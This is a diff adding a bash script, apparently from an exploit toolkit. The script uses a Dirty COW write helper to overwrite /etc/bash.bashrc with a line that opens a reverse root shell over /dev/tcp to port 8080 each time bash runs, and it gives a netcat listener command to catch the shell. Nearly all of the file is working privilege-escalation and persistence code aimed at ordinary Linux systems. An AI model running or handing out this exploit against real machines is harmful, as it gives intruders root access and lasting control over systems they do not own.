@@ -1,0 +1,29 @@
+#!/bin/bash
+#
+# Add a line to /etc/bash.bashrc that tries to open a reverse root shell at
+# localhost:8080 every minute. A backup of the old file is stored in $HOME
+# before modifying the file.
+#
+# Once the exploit completes, open a TCP server on localhost:8080. For example:
+#
+#	nc -lp 8080 localhost
+#
+# This server should receive a root shell connection once bash is ran.
+
+. "$(dirname "$0")/common.sh"
+
+# file to edit
+target=/etc/bash.bashrc
+
+# note the trailing '#' to ignore any garbage from the old line
+payload="nohup bash -c 'bash -i>&/dev/tcp/localhost/8080 0>&1' &#"
+payload_len=$(printf "$payload" | wc -c)
+
+if [ ! -r $target ]; then
+	die "$target does not exist or is not readable."
+elif [ "$(wc -c <$target)" -lt "$payload_len" ]; then
+	die "$target is not large enough to insert payload."
+fi
+
+backup $target "$HOME/$(basename $target)"
+dirtycow -s "$payload" $target
